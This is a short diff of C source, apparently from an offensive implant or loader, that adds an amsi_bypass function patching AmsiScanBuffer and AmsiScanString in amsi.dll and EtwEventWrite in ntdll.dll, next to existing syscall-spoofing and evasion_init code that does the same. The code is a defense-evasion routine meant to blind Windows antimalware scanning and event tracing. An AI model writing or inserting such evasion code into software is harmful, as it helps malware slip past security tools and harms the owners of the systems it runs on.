@@ -407,6 +407,12 @@ void *spoof_syscall_stub(unsigned short ssn) {
     return stub;
 }
 
+void amsi_bypass(void) {
+    patch_fn("amsi.dll",  "AmsiScanBuffer");
+    patch_fn("amsi.dll",  "AmsiScanString");
+    patch_fn("ntdll.dll", "EtwEventWrite");
+}
+
 void evasion_init(void) {
     patch_fn("amsi.dll",  "AmsiScanBuffer");
     patch_fn("amsi.dll",  "AmsiScanString");
